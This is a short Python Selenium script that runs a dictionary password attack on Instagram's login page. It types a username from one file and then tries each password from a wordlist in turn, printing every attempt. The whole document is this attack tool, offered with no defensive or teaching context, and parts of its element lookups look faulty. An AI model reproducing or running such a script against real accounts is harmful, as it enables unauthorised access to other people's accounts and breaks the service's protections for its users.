from selenium import webdriver
import time
from selenium.webdriver.common.keys import Keys


#get instagram page
driver = webdriver.Chrome()
driver.get("https://www.instagram.com")
time.sleep(2)


#get boxes then try pass.txt if succes y'll redirect into the homepage xD
username = driver.find_element_by_name('username')
password = driver.find_element_by_name('password')
nologin = driver.find_element_by_xpath('/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div[4]')
login = driver.find_element_by_xpath('/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div[4]')
user_txt = open('user.txt','r')
for line2 in user_txt:
	username.send_keys(line2)
	time.sleep(1)
	break
pass_lst = open('pass.lst','r')

for line in pass_lst:
	time.sleep(1)
	password.send_keys(Keys.CONTROL,'a')
	time.sleep(1)
	password.send_keys(line)
	login.click()
	time.sleep(1)
	print("Last password tried:", line)

time.sleep(3)
pass_lst.close()
user_txt.close()
#end
driver.close()
